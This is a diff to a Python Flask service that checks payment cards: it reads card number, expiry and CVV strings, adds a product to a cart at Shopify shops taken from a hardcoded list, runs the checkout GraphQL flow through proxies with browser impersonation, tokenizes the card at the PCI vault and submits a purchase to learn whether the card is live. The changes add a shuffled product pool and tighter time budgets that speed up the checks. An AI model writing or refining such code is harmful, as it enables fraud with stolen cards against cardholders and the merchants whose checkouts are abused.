@@ -21,13 +21,16 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚙️ ENV
+# ⚙️ ENV & CONFIG
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
-BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
+BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "25")) 
 
-# ═══ NEW: Load Hardcoded Products to bypass slow scraping ═══
+# ═══ FIX: Load Hardcoded Products & Create Shuffled Pool ═══
 _PRODUCTS_LIST = []
+_PRODUCT_POOL = []
+_PRODUCT_LOCK = threading.Lock()
+
 def _load_products():
     global _PRODUCTS_LIST
     file_path = os.path.join(os.path.dirname(__file__), "products.txt")
@@ -36,7 +39,6 @@ def _load_products():
     try:
         with open(file_path, "r", encoding="utf-8") as f:
             for line in f:
-                # Parses: ID: 58864569811325 | $1.5 | TITLE | URL
                 m = re.search(r'ID:\s*(\d+)\s*\|\s*\$?([\d.]+)\s*\|.*?\|\s*(https?://[^\s|]+)', line)
                 if m:
                     _PRODUCTS_LIST.append({
@@ -51,7 +53,19 @@ def _load_products():
 
 _load_products()
 
-# ═══ NEW: GraphQL Cache to save network requests ═══
+# ═══ FIX: Thread-safe Product Shuffler ═══
+def _get_next_product():
+    global _PRODUCT_POOL, _PRODUCTS_LIST
+    with _PRODUCT_LOCK:
+        if not _PRODUCTS_LIST:
+            return None
+        if not _PRODUCT_POOL:
+            # Pool is empty, refill and shuffle
+            _PRODUCT_POOL = list(_PRODUCTS_LIST)
+            random.shuffle(_PRODUCT_POOL)
+        # Pop from the end of the shuffled list
+        return _PRODUCT_POOL.pop()
+
 _GRAPHQL_CACHE = {}
 _GRAPHQL_LOCK = threading.Lock()
 
@@ -70,7 +84,6 @@ def _dec_busy():
     with _workers_lock: _workers_busy = max(0, _workers_busy - 1)
 
 _last_failure = {}
-
 _PRODUCT_CACHE = {}   
 _BLACKLIST = {}       
 _CACHE_LOCK = threading.Lock()
@@ -300,7 +313,7 @@ def _vault_domain(h):
 # ─────────────────────────────────────────────────────────────────────────────
 # 🔑 GRAPHQL IDS (Cached to save time)
 # ─────────────────────────────────────────────────────────────────────────────
-def _graphql_ids(session, shop_url, checkout_html, ua):
+def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
     with _GRAPHQL_LOCK:
         if shop_url in _GRAPHQL_CACHE:
             return _GRAPHQL_CACHE[shop_url]
@@ -308,7 +321,7 @@ def _graphql_ids(session, shop_url, checkout_html, ua):
     m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
     if not m: return None, None, None
     try:
-        js = session.get(shop_url + m.group(1), headers={"user-agent": ua}, timeout=8).text
+        js = session.get(shop_url + m.group(1), headers={"user-agent": ua}, timeout=t_rem).text
         p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
         s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
         q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
@@ -320,63 +333,6 @@ def _graphql_ids(session, shop_url, checkout_html, ua):
         return res
     except Exception:
         return None, None, None
-
-def _cheapest_product(session, shop_url, ua, timeout=8):
-    global _PRODUCT_CACHE, _BLACKLIST
-    now = time.time()
-    
-    with _CACHE_LOCK:
-        if shop_url in _PRODUCT_CACHE:
-            return _PRODUCT_CACHE[shop_url][0], _PRODUCT_CACHE[shop_url][1], [("cache", 200)]
-
-    diag = []
-    for ep in (f"{shop_url}/products.json?limit=250",
-               f"{shop_url}/collections/all/products.json?limit=250"):
-        try:
-            r = session.get(ep, headers={"user-agent": ua}, timeout=timeout)
-            diag.append((ep.split(shop_url)[-1], r.status_code))
-            if r.status_code != 200: continue
-            data = r.json()
-            best_price = float("inf"); best_vid = None; best_pstr = ""
-            for p in data.get("products", []):
-                for v in p.get("variants", []):
-                    if not v.get("available"): continue
-                    try: price = float(str(v.get("price","0")).replace(",","."))
-                    except Exception: continue
-                    if price > 0 and price < best_price:
-                        best_price, best_vid, best_pstr = price, str(v.get("id")), str(v.get("price","")) or str(best_price)
-            if best_vid:
-                with _CACHE_LOCK:
-                    _PRODUCT_CACHE[shop_url] = (best_vid, best_pstr)
-                return best_vid, best_pstr, diag
-        except Exception as e:
-            diag.append((ep.split(shop_url)[-1], f"exc:{str(e)[:40]}"))
-
-    try:
-        r = session.get(f"{shop_url}/collections/all", headers={"user-agent": ua}, timeout=timeout)
-        diag.append(("/collections/all (HTML)", r.status_code))
-        if r.status_code == 200:
-            m = re.search(r'"variants":\[(.*?)\]', r.text)
-            if m:
-                vid_match = re.search(r'"id":(\d+)', m.group(1))
-                if vid_match:
-                    vid = vid_match.group(1)
-                    with _CACHE_LOCK:
-                        _PRODUCT_CACHE[shop_url] = (vid, "0.00")
-                    return vid, "0.00", diag
-            
-            m = re.search(r'variantId[":\s]+["\']?(\d{10,})', r.text)
-            if m:
-                vid = m.group(1)
-                with _CACHE_LOCK:
-                    _PRODUCT_CACHE[shop_url] = (vid, "0.00")
-                return vid, "0.00", diag
-    except Exception as e:
-        diag.append(("/collections/all (HTML)", f"exc:{str(e)[:40]}"))
-
-    with _CACHE_LOCK:
-        _BLACKLIST[shop_url] = now + 300 
-    return None, None, diag
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 🛒 PAYLOAD BUILDER
@@ -476,7 +432,7 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
 # ─────────────────────────────────────────────────────────────────────────────
 # 🔑 PCI
 # ─────────────────────────────────────────────────────────────────────────────
-def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", vault_url="", vault_domain="", proxy_url=""):
+def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", vault_url="", vault_domain="", proxy_url="", t_rem=5):
     _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
     endpoint     = vault_url or _DEFAULT_VAULT
     scope        = vault_domain or shop_domain
@@ -514,7 +470,7 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
         "user-agent":           ua,
     }
 
-    post_kwargs = {"data": payload, "headers": headers, "timeout": 10}
+    post_kwargs = {"data": payload, "headers": headers, "timeout": t_rem}
     if proxy_url:
         post_kwargs["proxy"] = proxy_url
 
@@ -529,7 +485,7 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
         _last_failure = {"reason": "PCI_EXC", "err": str(e)[:100]}
 
     if "shopifyinc" in endpoint:
-        return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig, "https://checkout.pci.shopifycs.com/sessions", vault_domain, proxy_url)
+        return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig, "https://checkout.pci.shopifycs.com/sessions", vault_domain, proxy_url, t_rem)
 
     return None
 
@@ -560,22 +516,21 @@ def _classify_failed(code):
 def _run_check(card_str, proxy_str):
     t_start = time.monotonic()
     def remain(): return BUDGET_SEC - (time.monotonic() - t_start)
+    def t_max(sec): return min(sec, max(1, remain()))
 
     parts = card_str.split("|")
     if len(parts) < 4: return _resp("INVALID_CARD")
     ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
     yyyy = "20" + yy if len(yy) == 2 else yy
 
-    # ═══ FIX: Use Hardcoded Products List for Speed ═══
-    global _PRODUCTS_LIST
-    if _PRODUCTS_LIST:
-        prod = random.choice(_PRODUCTS_LIST)
+    # ═══ FIX: Get Unique Shuffled Product ═══
+    prod = _get_next_product()
+    if prod:
         shop_url = prod["shop"]
         vid = prod["vid"]
         price = prod["price"]
         diag = [("hardcoded", 200)]
     else:
-        # Fallback to old dynamic scraping
         sites = _get_sites()
         if not sites:
             return _fail("NO_SITES", hint="set SITES env var or upload site.txt")
@@ -597,7 +552,7 @@ def _run_check(card_str, proxy_str):
         for attempt_site in valid_sites[:3]:
             shop_url = attempt_site
             try:
-                vid, price, diag = _cheapest_product(session, shop_url, random.choice(USER_AGENTS), timeout=min(8, max(3, remain())))
+                vid, price, diag = _cheapest_product(session, shop_url, random.choice(USER_AGENTS), timeout=t_max(4))
             except Exception:
                 vid = None
             if vid:
@@ -606,7 +561,7 @@ def _run_check(card_str, proxy_str):
         if not vid:
             return _fail("NO_PRODUCTS", shop=shop_url, endpoints=diag)
 
-    if remain() < 20:
+    if remain() < 18:
         return _fail("BUDGET_AFTER_PRODUCT", elapsed=f"{BUDGET_SEC-remain():.1f}s")
 
     proxy_url = _parse_proxy(proxy_str)
@@ -619,12 +574,11 @@ def _run_check(card_str, proxy_str):
     try:
         try:
             r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
-                            allow_redirects=True, timeout=min(10, max(3, remain())))
-        except Exception:
-            return _resp("CART_FAILED", price=f"{price} USD")
+                            allow_redirects=True, timeout=t_max(4))
+        except Exception as e:
+            return _resp(f"CART_FAILED_{str(e)[:10]}", price=f"{price} USD")
         
         if r.status_code != 200:
-            # Clear cache if cart fails
             with _CACHE_LOCK:
                 _PRODUCT_CACHE.pop(shop_url, None)
             return _resp("CART_FAILED", price=f"{price} USD")
@@ -639,9 +593,9 @@ def _run_check(card_str, proxy_str):
         if not session_token: return _fail("NO_SESSION_TOKEN",  shop=shop_url)
         if not commit_sha:    return _fail("NO_COMMIT_SHA",     shop=shop_url)
         if not stable_id:     return _fail("NO_STABLE_ID",      shop=shop_url)
-        if remain() < 16:     return _fail("BUDGET_AFTER_CHECKOUT", shop=shop_url)
+        if remain() < 14:     return _fail("BUDGET_AFTER_CHECKOUT", shop=shop_url)
 
-        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua)
+        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(4))
         prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
         submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
         poll_id   = poll_id   or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
@@ -675,13 +629,13 @@ def _run_check(card_str, proxy_str):
 
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
-            r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+            r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
             
             if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
                 if "merchandiseLines" in r1.text and "not defined" in r1.text:
                     use_lines = True
                     p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
-                    r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+                    r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
                     
         except Exception as e:
             return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
@@ -690,13 +644,13 @@ def _run_check(card_str, proxy_str):
         queue_token = _queue_token(r1.text) or None
         if not queue_token:
             return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
-        if remain() < 12:
+        if remain() < 10:
             return _fail("BUDGET_AFTER_P1", shop=shop_url)
 
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
             p["variables"]["queueToken"] = queue_token
-            r2 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+            r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
         except Exception as e:
             return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])
         if r2.status_code != 200:
@@ -711,10 +665,12 @@ def _run_check(card_str, proxy_str):
         r3_text = ""
 
         for _ in range(2):  # Max 2 address attempts to save time
+            if remain() < 6:
+                return _fail("BUDGET_IN_P3", shop=shop_url)
             try:
                 p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
                 p["variables"]["queueToken"] = queue_token
-                r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+                r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
                 
                 if r3.status_code == 200:
                     r3_text = r3.text
@@ -745,7 +701,7 @@ def _run_check(card_str, proxy_str):
         if not pm_id:
             return _fail("NO_PAYMENT_ID", shop=shop_url, body=r3_text[:800])
 
-        if remain() < 6:
+        if remain() < 5:
             return _fail("BUDGET_AFTER_PROPOSALS", shop=shop_url)
 
         ident_sig = _ident_sig(checkout_html)
@@ -753,10 +709,10 @@ def _run_check(card_str, proxy_str):
         v_dom     = _vault_domain(checkout_html)
 
         sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
-                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url)
+                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(4))
         
         if not sid: return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
-        if remain() < 4: return _fail("BUDGET_AFTER_PCI", shop=shop_url)
+        if remain() < 3: return _fail("BUDGET_AFTER_PCI", shop=shop_url)
 
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
@@ -879,7 +835,7 @@ def _run_check(card_str, proxy_str):
                 r_submit = session.post(
                     f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                     json=_build_submit(cur_tax, cur_tot), headers=hdr,
-                    timeout=min(10, max(3, remain())),
+                    timeout=t_max(5),
                 )
                 body = r_submit.text
             except Exception as e:
@@ -907,16 +863,16 @@ def _run_check(card_str, proxy_str):
         if '"ProcessingReceipt"' in body:
             rid = _receipt_id(body)
             rss = _receipt_session(body)
-            if rid and rss and remain() > 4:
-                for _ in range(6):
-                    if remain() < 3: break
+            if rid and rss and remain() > 3:
+                for _ in range(3):
+                    if remain() < 2: break
                     time.sleep(0.4)
                     try:
                         params = {"operationName":"PollForReceipt",
                                   "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
                                   "id": poll_id}
                         r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
-                                          headers=hdr, timeout=min(8, max(2, remain())))
+                                          headers=hdr, timeout=t_max(3))
                         pb = r_p.text
                         if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
                             ms = (time.monotonic() - t_start) * 1000
@@ -974,21 +930,9 @@ def route_debug():
 def route_sites():
     return jsonify({
         "hardcoded_products": len(_PRODUCTS_LIST),
+        "pool_remaining": len(_PRODUCT_POOL),
         "sample": _PRODUCTS_LIST[:3] if _PRODUCTS_LIST else []
     })
-
-@app.route("/test")
-def route_test():
-    if not _PRODUCTS_LIST:
-        return jsonify({"error": "products.txt empty or missing"})
-    shop_url = _PRODUCTS_LIST[0]["shop"]
-    try:
-        sess = requests.Session(impersonate="chrome124")
-        t0 = time.time()
-        r  = sess.get(f"{shop_url}/products.json?limit=5", timeout=10)
-        return jsonify({"shop": shop_url, "status": r.status_code, "time": int((time.time() - t0) * 1000)})
-    except Exception as e:
-        return jsonify({"shop": shop_url, "error": str(e)[:200]})
 
 # ─────────────────────────────────────────────────────────────────────────────
 # ▶️ ENTRY
